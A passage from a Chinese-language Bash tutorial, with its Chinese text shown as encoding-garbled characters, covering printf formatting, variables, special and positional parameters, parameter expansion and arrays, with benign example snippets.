<table><thead><tr><th>åºåˆ—</th><th>å«ä¹‰</th><th>åœºæ™¯</th></tr></thead><tbody><tr><td><strong>\n</strong></td><td><strong>æ¢è¡Œ</strong></td><td>å‡ ä¹æ¯æ¡æŒ‡ä»¤æœ«å°¾éƒ½å¿…é¡»åŠ </td></tr><tr><td><strong>\t</strong></td><td><strong>æ°´å¹³åˆ¶è¡¨ç¬¦ (Tab)</strong></td><td>ç”¨äºç®€æ˜“çš„åˆ—å¯¹é½</td></tr><tr><td>\</td><td>åæ–œæ æœ¬èº«</td><td>è¾“å‡ºè·¯å¾„æ—¶å¸¸ç”¨</td></tr><tr><td>\r</td><td>å›è½¦ (CR)</td><td>å…‰æ ‡å›åˆ°è¡Œé¦–ï¼ˆå¸¸ç”¨äºè¦†ç›–å½“å‰è¡Œå®ç°ç®€æ˜“è¿›åº¦æ¡ï¼‰</td></tr><tr><td>\0ddd</td><td>å…«è¿›åˆ¶å­—èŠ‚</td><td>è¾“å‡ºç‰¹æ®Š ASCII å­—ç¬¦</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å•å¼•å·</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">'%d %s\n'</span> 1 <span class="hljs-string">"abc"</span>
<span class="hljs-comment">#  Output:1 abc</span>

<span class="hljs-comment"># åŒå¼•å·</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%d %s\n"</span> 1 <span class="hljs-string">"abc"</span>
<span class="hljs-comment">#  Output:1 abc</span>

<span class="hljs-comment"># æ— å¼•å·</span>
<span class="hljs-built_in">printf</span> %s abcdef
<span class="hljs-comment">#  Output: abcdef(å¹¶ä¸ä¼šæ¢è¡Œ)</span>

<span class="hljs-comment"># æ ¼å¼åªæŒ‡å®šäº†ä¸€ä¸ªå‚æ•°ï¼Œä½†å¤šå‡ºçš„å‚æ•°ä»ç„¶ä¼šæŒ‰ç…§è¯¥æ ¼å¼è¾“å‡º</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s\n"</span> abc def
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  abc</span>
<span class="hljs-comment">#  def</span>

<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s %s %s\n"</span> a b c d e f g h i j
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  a b c</span>
<span class="hljs-comment">#  d e f</span>
<span class="hljs-comment">#  g h i</span>
<span class="hljs-comment">#  j</span>

<span class="hljs-comment"># å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œé‚£ä¹ˆ %s ç”¨ NULL ä»£æ›¿ï¼Œ%d ç”¨ 0 ä»£æ›¿</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s and %d \n"</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#   and 0</span>

<span class="hljs-comment"># æ ¼å¼åŒ–è¾“å‡º</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4s\n"</span> å§“å æ€§åˆ« ä½“é‡kg
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> éƒ­é– ç”· 66.1234
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> æ¨è¿‡ ç”· 48.6543
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> éƒ­èŠ™ å¥³ 47.9876
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  å§“å     æ€§åˆ«   ä½“é‡kg</span>
<span class="hljs-comment">#  éƒ­é–     ç”·      66.12</span>
<span class="hljs-comment">#  æ¨è¿‡     ç”·      48.65</span>
<span class="hljs-comment">#  éƒ­èŠ™     å¥³      47.99</span>
</code></pre>
<blockquote>
<p>æ—¥å¸¸ç®€å•è¾“å‡ºç”¨<code>echo</code>å³å¯ï¼›ä½†åœ¨éœ€è¦ä¸¥æ ¼æ§åˆ¶å¯¹é½ï¼ˆå¦‚æ‰“å°è¡¨æ ¼ï¼‰æˆ–å¤„ç†ç‰¹æ®Šæ ¼å¼æ—¶ï¼Œ<code>printf</code>æ˜¯ä¸å¯æ›¿ä»£çš„ç¥å™¨</p>
</blockquote>
<h3 data-id="heading-15">å˜é‡</h3>
<p>Bash ä¸­æ²¡æœ‰æ•°æ®ç±»å‹ï¼Œå˜é‡å¯ä»¥ä¿å­˜ä¸€ä¸ªæ•°å­—ã€ä¸€ä¸ªå­—ç¬¦ã€ä¸€ä¸ªå­—ç¬¦ä¸²ç­‰ã€‚åŒæ—¶æ— éœ€æå‰å£°æ˜å˜é‡ï¼Œç»™å˜é‡èµ‹å€¼ä¼šç›´æ¥åˆ›å»ºå˜é‡</p>
<ul>
<li>åªèƒ½ä½¿ç”¨è‹±æ–‡å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œä¸”ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</li>
<li><strong>å˜é‡åå’Œç­‰å·ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼</strong>ï¼ˆ<code>name = value</code>æ˜¯é”™çš„ï¼‰</li>
<li>ä¸èƒ½ä½¿ç”¨ bash é‡Œçš„å…³é”®å­—ï¼ˆhelp å‘½ä»¤æŸ¥çœ‹ä¿ç•™å…³é”®å­—ï¼‰</li>
<li>å¯ä»¥ä½¿ç”¨é©¼å³°ï¼ˆpersonOfNameï¼‰æˆ–è€…ç°ä»£å¼ï¼ˆperson_of_nameï¼‰</li>
</ul>
<p>è®¿é—®å˜é‡çš„è¯­æ³•å½¢å¼ä¸ºï¼š<code>${var}</code>å’Œ<code>$var</code>ã€‚èŠ±æ‹¬å·æ˜¯ä¸ºäº†å¸®åŠ©è§£é‡Šå™¨è¯†åˆ«å˜é‡çš„è¾¹ç•Œï¼Œæ¨èä½¿ç”¨<code>${var}</code></p>
<pre><code class="hljs language-bash" lang="bash">word=<span class="hljs-string">"hello"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${word}</span> <span class="hljs-comment"># hello</span>
</code></pre>
<p>å˜é‡èµ‹å€¼æ–¹æ³•æœ‰å¾ˆå¤šï¼Œä»¥ä¸‹ä¸ºå¸¸ç”¨çš„èµ‹å€¼æ–¹å¼ï¼š</p>

























<table><thead><tr><th>èµ‹å€¼æ–¹æ³•</th><th>æ ¼å¼</th></tr></thead><tbody><tr><td>ç›´æ¥èµ‹å€¼</td><td>name=zhangsan</td></tr><tr><td>å‘½ä»¤ç»“æœèµ‹å€¼</td><td>path=`pwd`</td></tr><tr><td>è„šæœ¬ä¼ å‚</td><td>user_name=$1</td></tr><tr><td>readäº¤äº’å¼èµ‹å€¼ï¼ˆä¸å¸¸ç”¨ï¼‰</td><td><code>-p</code>ï¼šäº¤äº’æ—¶æç¤ºä¿¡æ¯<br/><code>-t</code>ï¼šè¶…è¿‡æ—¶é—´æ²¡æ“ä½œåˆ™è‡ªåŠ¨é€€å‡º<br/><code>-s</code>ï¼šä¸æ˜¾ç¤ºç”¨æˆ·çš„è¾“å…¥</td></tr></tbody></table>
<h4 data-id="heading-16">å˜é‡ç±»å‹</h4>
<ul>
<li><strong>å±€éƒ¨å˜é‡</strong>ï¼šåœ¨å½“å‰ Shell è¿›ç¨‹æˆ–è„šæœ¬ä¸­å®šä¹‰çš„å˜é‡ï¼Œä»…åœ¨å½“å‰è¿›ç¨‹æœ‰æ•ˆã€‚ä¸ä¼šè¢«å­ Shell æˆ–å­è„šæœ¬ç»§æ‰¿</li>
<li><strong>ç¯å¢ƒå˜é‡</strong>ï¼š export å¯¼å‡ºçš„å˜é‡ï¼Œåœ¨å½“å‰è¿›ç¨‹åŠå…¶äº§ç”Ÿçš„æ‰€æœ‰å­è¿›ç¨‹ä¸­æœ‰æ•ˆ</li>
<li><strong>Shellç‰¹æ®Šå˜é‡</strong>ï¼šç”± Shell ç¨‹åºï¼ˆå¦‚ bashï¼‰å¯åŠ¨æ—¶è‡ªåŠ¨è®¾ç½®çš„åªè¯»æˆ–è¯»å†™å˜é‡ï¼Œç”¨äºç»´æŒ Shell çš„è¿è¡Œ</li>
</ul>
<h5 data-id="heading-17">ç¯å¢ƒå˜é‡</h5>
<p>å¸¸è§çš„ç¯å¢ƒå˜é‡ï¼š</p>

























































<table><thead><tr><th>å˜é‡</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>$HOME</code></td><td>å½“å‰ç”¨æˆ·çš„ç”¨æˆ·ç›®å½•</td></tr><tr><td><code>$LANG</code></td><td>ç³»ç»Ÿè¯­è¨€ä¸å­—ç¬¦é›†</td></tr><tr><td><code>$PATH</code></td><td>è®°å½•<strong>å‘½ä»¤ä½ç½®</strong>çš„ç¯å¢ƒå˜é‡ï¼Œè¿è¡Œå‘½ä»¤çš„æ—¶å€™bashä¼šåœ¨PATHçš„è·¯å¾„ä¸­æŸ¥æ‰¾</td></tr><tr><td><code>$PWD</code></td><td>å½“å‰å·¥ä½œç›®å½•</td></tr><tr><td><code>$UID</code></td><td>æ•°å€¼ç±»å‹ï¼Œå½“å‰ç”¨æˆ·çš„ç”¨æˆ· ID</td></tr><tr><td><code>$PS1</code></td><td>å‘½ä»¤è¡Œçš„ä¸»æç¤ºç¬¦ï¼Œç”¨æˆ·åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤æ—¶çœ‹åˆ°çš„é»˜è®¤æç¤ºç¬¦</td></tr><tr><td><code>$PS2</code></td><td>è¾…åŠ©æç¤ºç¬¦ï¼Œç”¨äºå¤šè¡Œå‘½ä»¤è¾“å…¥æ—¶çš„æç¤º</td></tr><tr><td>$RANDOM</td><td>0~32767ä¹‹é—´çš„æ•´æ•°</td></tr><tr><td>$HISTSIZE</td><td>history å‘½ä»¤è®°å½•å‘½ä»¤ä¸Šé™</td></tr><tr><td>$HISTFILESIZE</td><td>history å†å²è®°å½•æ–‡ä»¶çš„å¤§å°</td></tr><tr><td>$HISTCONTROL</td><td>æ§åˆ¶å†å²å‘½ä»¤è®°å½•æˆ–ä¸è®°å½•å“ªäº›å†…å®¹</td></tr><tr><td>$HISTFILE</td><td>æŒ‡å®šå†å²å‘½ä»¤çš„è®°å½•æ–‡ä»¶</td></tr></tbody></table>
<blockquote>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Ftldp.org%2FLDP%2FBash-Beginners-Guide%2Fhtml%2Fsect_03_02.html%23%23%23sect_03_02_04" target="_blank" title="http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_02.html###sect_03_02_04" ref="nofollow noopener noreferrer">è¿™é‡Œ</a> æœ‰ä¸€å¼ æ›´å…¨é¢çš„ Bash ç¯å¢ƒå˜é‡åˆ—è¡¨</p>
</blockquote>
<p>åœ¨ Shell ä¸­ï¼Œä¸ç¯å¢ƒå˜é‡ç›¸å…³çš„å¸¸ç”¨å…³é”®å­—åŠå‘½ä»¤å¦‚ä¸‹</p>






























<table><thead><tr><th>å…³é”®å­—</th><th>åŠŸèƒ½</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>export</td><td>å°†å˜é‡å¯¼å‡ºä¸ºç¯å¢ƒå˜é‡ï¼Œä½¿å…¶å¯¹å­è¿›ç¨‹å¯è§</td><td>export VAR=val</td></tr><tr><td>env</td><td>æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„ç¯å¢ƒå˜é‡</td><td>env</td></tr><tr><td>set</td><td>æ˜¾ç¤ºå½“å‰Shellçš„æ‰€æœ‰å˜é‡ï¼ˆç¯å¢ƒå˜é‡ã€å±€éƒ¨å˜é‡ã€ Shell å‡½æ•°ï¼‰</td><td>set | grep VAR</td></tr><tr><td>unset</td><td>åˆ é™¤å˜é‡ï¼ˆåŒ…æ‹¬ç¯å¢ƒå˜é‡ï¼‰ï¼Œä½†ä»…å½±å“å½“å‰ShellåŠå­è¿›ç¨‹</td><td>unset VAR</td></tr></tbody></table>
<h5 data-id="heading-18">ç‰¹æ®Šå˜é‡</h5>
<p><strong>å˜é‡ååªèƒ½åŒ…å«æ•°å­—ã€å­—æ¯å’Œä¸‹åˆ’çº¿</strong>ï¼Œå› ä¸ºæŸäº›åŒ…å«å…¶ä»–å­—ç¬¦çš„å˜é‡æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œè¿™æ ·çš„å˜é‡è¢«ç§°ä¸º<strong>ç‰¹æ®Šå˜é‡</strong></p>
<h6 data-id="heading-19">ä½ç½®å˜é‡</h6>





























<table><thead><tr><th>ä½ç½®å˜é‡</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>$0</code></td><td>å½“å‰è„šæœ¬çš„æ–‡ä»¶å</td></tr><tr><td><code>$n</code></td><td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n ä¸ºæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>$1</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯<code>$2</code><br/>å½“<code>n&gt;9</code>æ—¶ï¼Œéœ€è¦åŠ ä¸Š<code>{}</code>ï¼Œé¿å…äº§ç”Ÿæ­§ä¹‰</td></tr><tr><td><code>$#</code></td><td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•°</td></tr><tr><td><code>$*</code></td><td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°</td></tr><tr><td><code>$@</code></td><td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚è¢«åŒå¼•å·åŒ…å«æ—¶ï¼Œä¸<code>$*</code>ä¸åŒ</td></tr></tbody></table>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">!/bin/bash</span>
echo "File Name: $0"
echo "First Parameter : $1"
echo "Second Parameter : $2"
echo "Quoted Values: $@"
echo "Quoted Values: $*"
echo "Total Number of Parameters : $#"
<span class="hljs-meta prompt_">
# </span><span class="bash">output</span>
<span class="hljs-meta prompt_"># </span><span class="bash">./test.sh Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">File Name : ./test.sh</span>
<span class="hljs-meta prompt_"># </span><span class="bash">First Parameter : Hello</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Second Parameter : World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Quoted Values: Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Quoted Values: Hello World</span>
<span class="hljs-meta prompt_"># </span><span class="bash">Total Number of Parameters : 2</span>
</code></pre>
<blockquote>
<p><code>$*</code>å’Œ<code>$@</code>çš„åŒºåˆ«ï¼š</p>
<p>1ï¼‰ä¸è¢«åŒå¼•å·åŒ…å«æ—¶ï¼Œéƒ½ä»¥<code>"$1" "$2" â€¦ "$n"</code>çš„å½¢å¼è¾“å‡ºæ‰€æœ‰å‚æ•°</p>
<p>2ï¼‰è¢«åŒå¼•å·åŒ…å«æ—¶</p>
<ul>
<li><code>"$*"</code>ï¼šå°†æ‰€æœ‰å‚æ•°å‹ç¼©ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² -&gt; <code>"$1 $2 â€¦ $n"</code></li>
<li><code>"$@"</code>ï¼šå°†æ¯ä¸ªå‚æ•°ä¿ç•™ä¸ºç‹¬ç«‹çš„å­—ç¬¦ä¸² -&gt; <code>"$1" "$2" â€¦ "$n"</code></li>
</ul>
<p>åœ¨ç¼–å†™å¾ªç¯å¤„ç†å‚æ•°çš„è„šæœ¬æ—¶ï¼ˆæ¯”å¦‚éå†è¾“å…¥çš„æ–‡ä»¶åˆ—è¡¨ï¼‰ï¼Œ<strong>æ°¸è¿œä½¿ç”¨ "$@"</strong>ï¼Œé™¤éä½ éå¸¸ç¡®å®šä½ åœ¨åšä»€ä¹ˆ</p>
</blockquote>
<h6 data-id="heading-20">çŠ¶æ€å˜é‡</h6>

























<table><thead><tr><th>çŠ¶æ€å˜é‡</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>$?</code></td><td>ä¸Šä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼ï¼Œé0ä¸ºå¼‚å¸¸</td></tr><tr><td><code>$$</code></td><td>å½“å‰Shellè¿›ç¨‹IDã€‚å¯¹äº Shell è„šæœ¬ï¼Œå°±æ˜¯è¿™äº›è„šæœ¬æ‰€åœ¨çš„è¿›ç¨‹ID</td></tr><tr><td><code>$!</code></td><td>ä¸Šä¸€ä¸ªè„šæœ¬/å‘½ä»¤ï¼ˆæŒç»­è¿è¡Œï¼‰çš„PID</td></tr><tr><td><code>$_</code></td><td>ä¸Šä¸€ä¸ªå‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•°</td></tr></tbody></table>
<p>é€€å‡ºçŠ¶æ€æŒ‡ä¸Šä¸€ä¸ªå‘½ä»¤æ‰§è¡Œåçš„è¿”å›ç»“æœï¼Œä¸ºä¸€ä¸ªæ•°å­—ã€‚å¤§éƒ¨åˆ†å‘½ä»¤æ‰§è¡ŒæˆåŠŸä¼šè¿”å› 0ï¼Œå¤±è´¥è¿”å› 1ï¼Œä¹Ÿæœ‰ä¸€äº›å‘½ä»¤è¿”å›å…¶ä»–å€¼ï¼Œè¡¨ç¤ºä¸åŒç±»å‹çš„é”™è¯¯</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-keyword">if</span> [[ $? != 0 ]];<span class="hljs-keyword">then</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"error"</span>
  <span class="hljs-built_in">exit</span> 1;
<span class="hljs-keyword">fi</span>
</code></pre>
<h6 data-id="heading-21">å˜é‡å­ä¸²</h6>
<p><strong>å˜é‡å­ä¸²</strong> æ˜¯æŒ‡ä»ä¸€ä¸ªå˜é‡çš„å€¼ä¸­æå–å‡ºä¸€éƒ¨åˆ†å­å­—ç¬¦ä¸²çš„æ“ä½œï¼Œä¸»è¦é€šè¿‡**å‚æ•°æ‰©å±•ï¼ˆParameter Expansionï¼‰**å®ç°</p>













































<table><thead><tr><th>å˜é‡å­ä¸²</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>${#param}</td><td>ç»Ÿè®¡å­—ç¬¦é•¿åº¦</td></tr><tr><td>${param#word}</td><td>åˆ é™¤æœ€çŸ­åŒ¹é…å‰ç¼€</td></tr><tr><td>${param##word}</td><td>åˆ é™¤æœ€é•¿åŒ¹é…å‰ç¼€</td></tr><tr><td>${param%word}</td><td>åˆ é™¤æœ€çŸ­åŒ¹é…åç¼€</td></tr><tr><td>${param%%word}</td><td>åˆ é™¤æœ€é•¿åŒ¹é…åç¼€</td></tr><tr><td>${param:offset}</td><td>æˆªå–å­—ç¬¦ä¸²ï¼ˆoffsetä»0å¼€å§‹è®¡ç®—ï¼‰</td></tr><tr><td>${param:offset:length}</td><td>æˆªå–å­—ç¬¦ä¸²ï¼ˆoffsetä»0å¼€å§‹è®¡ç®—ï¼‰</td></tr><tr><td>${param/pattern/replacement}</td><td>æ›¿æ¢ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹</td></tr><tr><td>${param//pattern/replacement}</td><td>æ›¿æ¢æ‰€æœ‰åŒ¹é…é¡¹</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">param1=<span class="hljs-string">"example.txt"</span>
param2=<span class="hljs-string">"/usr/local/bin/zabbix_agentd"</span>
param3=<span class="hljs-string">"archive.tar.gz"</span>
param4=<span class="hljs-string">"archive.tar.gz"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param1#*.}</span>      <span class="hljs-comment"># è¾“å‡º "txt"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param2##*/}</span>     <span class="hljs-comment"># è¾“å‡º "zabbix_agentd"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param3%.*}</span>      <span class="hljs-comment"># è¾“å‡º "archive.tar"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${param4%%.*}</span>     <span class="hljs-comment"># è¾“å‡º "archive"</span>

str=<span class="hljs-string">"apple banana apple"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${str/apple/orange}</span>   <span class="hljs-comment"># è¾“å‡º "orange banana apple"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${str//apple/orange}</span>  <span class="hljs-comment"># è¾“å‡º "orange banana orange"</span>
</code></pre>
<blockquote>
<p><code>basename</code>ç­‰ä»·äº<code>${dir##*/}</code>ï¼Œ<code>dirname</code>ç­‰ä»·äº<code>${dir%/*}</code></p>
</blockquote>
<h4 data-id="heading-22">å˜é‡æ‰©å±•</h4>
<p>å¯ä»¥é€šè¿‡å‚æ•°æ‰©å±•ï¼ˆParameter Expansionï¼‰ä¸ºå˜é‡è®¾ç½®é»˜è®¤å€¼</p>

























<table><thead><tr><th>å˜é‡æ‰©å±•</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>${variable:-default}</td><td>å¦‚æœå˜é‡æœªå®šä¹‰æˆ–ä¸ºç©ºï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼ï¼ˆä¸æ”¹å˜å˜é‡å®é™…å€¼ï¼‰</td></tr><tr><td>${variable:=default}</td><td>å¦‚æœå˜é‡æœªå®šä¹‰æˆ–ä¸ºç©ºï¼Œåˆ™å°†é»˜è®¤å€¼èµ‹å€¼ç»™å˜é‡</td></tr><tr><td>${variable:+alternate}</td><td>å¦‚æœå˜é‡å·²å®šä¹‰ä¸”éç©ºï¼Œåˆ™ä½¿ç”¨æ›¿ä»£å€¼ï¼ˆä¸æ”¹å˜å˜é‡å®é™…å€¼ï¼‰</td></tr><tr><td>${variable:?message}</td><td>å¦‚æœå˜é‡æœªå®šä¹‰æˆ–ä¸ºç©ºï¼Œåˆ™æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯å¹¶é€€å‡ºè„šæœ¬</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># æƒ…å†µ 1ï¼šå˜é‡æœªå®šä¹‰</span>
<span class="hljs-built_in">unset</span> username
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:-"guest"}</span>"</span>   <span class="hljs-comment"># è¾“å‡º "Username: guest"</span>

<span class="hljs-comment"># æƒ…å†µ 2ï¼šå˜é‡ä¸ºç©º</span>
username=<span class="hljs-string">""</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:="default_user"}</span>"</span>   <span class="hljs-comment"># è¾“å‡º "Username: default_user"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"After assignment: <span class="hljs-variable">$username</span>"</span>             <span class="hljs-comment"># è¾“å‡º "After assignment: default_user"</span>

<span class="hljs-comment"># æƒ…å†µ 3ï¼šå˜é‡å·²å®šä¹‰</span>
username=<span class="hljs-string">"admin"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Username: <span class="hljs-variable">${username:+"User exists"}</span>"</span>    <span class="hljs-comment"># è¾“å‡º "Username: User exists"</span>

<span class="hljs-comment"># æƒ…å†µ 4ï¼šå¼ºåˆ¶æ£€æŸ¥å˜é‡æ˜¯å¦å·²è®¾ç½®</span>
<span class="hljs-built_in">unset</span> password
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${password:?"Password is required"}</span>       <span class="hljs-comment"># è¾“å‡ºé”™è¯¯å¹¶é€€å‡ºè„šæœ¬</span>
</code></pre>
<h3 data-id="heading-23">æ•°ç»„</h3>
<p>Bash ä»…æ”¯æŒ<strong>ä¸€ç»´æ•°ç»„</strong>ï¼Œä½†å…¶è®¾è®¡çµæ´»ï¼šæ•°ç»„çš„å¤§å°æ²¡æœ‰é™åˆ¶ï¼Œä¸”ä¸‹æ ‡æ˜¯ä¸è¿ç»­çš„ï¼ˆç¨€ç–æ•°ç»„ï¼‰ã€‚æ•°ç»„ä¸‹æ ‡ä» 0 å¼€å§‹</p>
<p>Bash æ•°ç»„ç”¨æ‹¬å· () æ¥è¡¨ç¤ºï¼Œå…ƒç´ ä¹‹é—´ç”¨<strong>ç©ºæ ¼</strong>ï¼ˆéé€—å·ï¼‰åˆ†éš”</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¸¸è§„åˆå§‹åŒ–ï¼ˆè‡ªåŠ¨ç´¢å¼• 0, 1, 2...ï¼‰</span>
colors=(red yellow <span class="hljs-string">"dark blue"</span>) 

<span class="hljs-comment"># æ˜¾å¼æŒ‡å®šç´¢å¼•ï¼ˆç¨€ç–æ•°ç»„ï¼Œä¸è¿ç»­ï¼‰</span>
<span class="hljs-comment"># ç´¢å¼•ä¸º 0, 1, 9ï¼Œä¸­é—´ç©ºç¼º</span>
nums=([0]=0 [1]=1 [9]=99)
</code></pre>
<p>è®¿é—®æ‰€æœ‰å…ƒç´ æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>${arr[@]}</code>æˆ–<code>${arr[*]}</code>ã€‚åœ¨<strong>ä¸åŠ åŒå¼•å·</strong>æ—¶ï¼Œä¸¤è€…æ•ˆæœç›¸åŒï¼›ä½†åœ¨<strong>åŒå¼•å·</strong>åŒ…è£¹ä¸‹ï¼Œå·®å¼‚å·¨å¤§ã€‚è¿™æ˜¯ Shell è„šæœ¬ä¸­æœ€å®¹æ˜“äº§ç”Ÿ Bug çš„åœ°æ–¹</p>




















<table><thead><tr><th>è¯­æ³•</th><th>åŒå¼•å·åŒ…è£¹æ—¶è¡Œä¸º</th><th>é€»è¾‘æ¨¡å‹</th></tr></thead><tbody><tr><td>"${arr[@]}"</td><td><strong>ä¿æŒåŸçŠ¶</strong>ã€‚å°†æ¯ä¸ªæ•°ç»„å…ƒç´ ä½œä¸ºç‹¬ç«‹çš„å‚æ•°ä¼ é€’</td><td>List&lt;String&gt;</td></tr><tr><td>"${arr[*]}"</td><td><strong>åˆå¹¶å­—ç¬¦ä¸²</strong>ã€‚å°†æ‰€æœ‰å…ƒç´ åˆå¹¶ä¸ºä¸€ä¸ªé•¿å­—ç¬¦ä¸²ï¼Œä¸­é—´ä»¥ç¬¬ä¸€ä¸ª IFS å­—ç¬¦è¿æ¥ï¼ˆé»˜è®¤æ˜¯ç©ºæ ¼ï¼‰</td><td>String</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">colors=(red yellow <span class="hljs-string">"dark blue"</span>)
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æµ‹è¯•ï¼šä½¿ç”¨ printf æ‰“å°æ¯ä¸ªå‚æ•°ï¼ŒéªŒè¯å‚æ•°ä¸ªæ•°</span>

<span class="hljs-comment"># ${arr[*]} æŠŠæ‰€æœ‰ä¸œè¥¿ç²˜åœ¨ä¸€èµ·äº†</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"+ %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">${colors[*]}</span>"</span>
<span class="hljs-comment"># Output:</span>
<span class="hljs-comment"># + red yellow dark blue</span>

<span class="hljs-comment"># ${arr[@]} å®Œç¾ä¿ç•™äº†æ•°ç»„è¾¹ç•Œå’Œå†…éƒ¨ç©ºæ ¼</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"+ %s\n"</span> <span class="hljs-string">"<span class="hljs-variable">${colors[@]}</span>"</span>
<span class="hljs-comment"># Output:</span>
<span class="hljs-comment"># + red</span>
<span class="hljs-comment"># + yellow</span>
<span class="hljs-comment"># + dark blue</span>
</code></pre>
<p><strong>æ•°ç»„æ“ä½œé€ŸæŸ¥è¡¨</strong></p>








































<table><thead><tr><th>æ“ä½œç±»å‹</th><th>è¯­æ³•ç¤ºä¾‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>å•å…ƒç´ è¯»å–</strong></td><td>${colors[1]}</td><td>è¯»å–ç´¢å¼•ä¸º 1 çš„å…ƒç´ </td></tr><tr><td><strong>è·å–é•¿åº¦</strong></td><td>${#colors[@]}</td><td>æ•°ç»„å…ƒç´ çš„<strong>ä¸ªæ•°</strong>ï¼ˆä¸æ˜¯æœ€å¤§ä¸‹æ ‡ï¼‰</td></tr><tr><td><strong>å…ƒç´ é•¿åº¦</strong></td><td>${#colors[0]}</td><td>è·å–ç¬¬ä¸€ä¸ªå…ƒç´ å­—ç¬¦ä¸²çš„é•¿åº¦</td></tr><tr><td><strong>åˆ‡ç‰‡</strong></td><td>${colors[@]:0:2}</td><td>ä»ç´¢å¼• 0 å¼€å§‹ï¼Œå– 2 ä¸ªå…ƒç´ </td></tr><tr><td><strong>è¿½åŠ /ä¿®æ”¹</strong></td><td>colors+=(green)</td><td>+= æ˜¯æœ€å®‰å…¨çš„è¿½åŠ æ–¹å¼ï¼›ä¹Ÿå¯ç›´æ¥ colors[9]=black èµ‹å€¼</td></tr><tr><td><strong>åˆ é™¤</strong></td><td>unset colors[1]</td><td><strong>æ³¨æ„</strong>ï¼šåªç½®ç©ºè¯¥ä½ç½®ï¼Œæ•°ç»„ç´¢å¼•ä¸ä¼šé‡æ’ï¼ˆå˜ç¨€ç–äº†ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-24">è¿ç®—ç¬¦</h3>
